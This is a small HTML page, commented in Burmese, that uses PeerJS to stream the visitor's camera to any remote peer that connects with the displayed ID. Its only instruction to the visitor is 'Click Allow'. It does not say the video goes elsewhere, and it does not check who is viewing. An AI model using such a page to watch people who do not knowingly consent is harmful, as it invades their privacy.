<!DOC TYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device</title>

  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>

  <style>
    body {
      margin: 0;
      padding: 30px 20px;
      background: #101522;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    .box {
      margin-top: 25px;
      padding: 20px;
      background: #202a42;
      border-radius: 15px;
    }

    #myId {
      margin-top: 15px;
      padding: 15px;
      background: #111827;
      border-radius: 10px;
      word-break: break-all;
    }

    button {
      margin-top: 25px;
      padding: 14px 25px;
      border: 0;
      border-radius: 10px;
      background: #4d7cff;
      color: white;
      font-size: 16px;
    }

    button:disabled {
      background: #555;
    }
  </style>
</head>

<body>
  <p> Click Allow</p>

  <div class="box">
    <div>ID</div>
    <div id="myId">Connecting...</div>
  </div>

  <button id="cameraBtn" onclick="startCamera()">
    Allow
  </button>

<script>

const peer = new Peer();

let cameraStream = null;


// Camera ID ရယူခြင်း
peer.on("open", function(id) {

  document.getElementById("myId").textContent = id;

});


// Camera permission တောင်းခြင်း
async function startCamera() {

  if (cameraStream) return;

  try {

    cameraStream =
      await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false
      });

    document.getElementById("cameraBtn").disabled = true;

    console.log("Camera permission granted");

  } catch (error) {

    console.error(error);

    alert(
      "Camera permission မရပါ။ Chrome permission ကိုစစ်ပါ။"
    );
  }
}


// Viewer က connection လာတဲ့အခါ
peer.on("connection", function(connection) {

  connection.on("data", function(data) {

    if (
      data &&
      data.type === "request-stream" &&
      cameraStream
    ) {

      const viewerId = data.viewerId;

      const call =
        peer.call(viewerId, cameraStream);

      call.on("close", function() {
        console.log("Viewer disconnected");
      });

      call.on("error", function(error) {
        console.error(error);
      });
    }

  });

});

</script>

</body>
</html>
